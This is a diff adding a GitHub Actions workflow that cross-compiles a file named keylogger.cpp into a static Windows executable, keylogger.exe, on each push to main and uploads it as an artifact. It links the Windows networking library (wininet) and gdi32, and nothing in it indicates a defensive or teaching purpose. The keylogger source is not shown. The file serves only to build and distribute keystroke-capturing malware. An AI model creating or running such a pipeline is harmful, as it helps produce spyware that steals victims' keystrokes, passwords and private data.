@@ -1,0 +1,25 @@
+name: Build Windows EXE
+
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      - name: Install MinGW cross-compiler
+        run: |
+          sudo apt update
+          sudo apt install -y g++-mingw-w64-x86-64
+      - name: Compile keylogger
+        run: |
+          ls -la
+          x86_64-w64-mingw32-g++ -o keylogger.exe keylogger.cpp -lwininet -lgdi32 -static
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: keylogger-exe
+          path: keylogger.exe
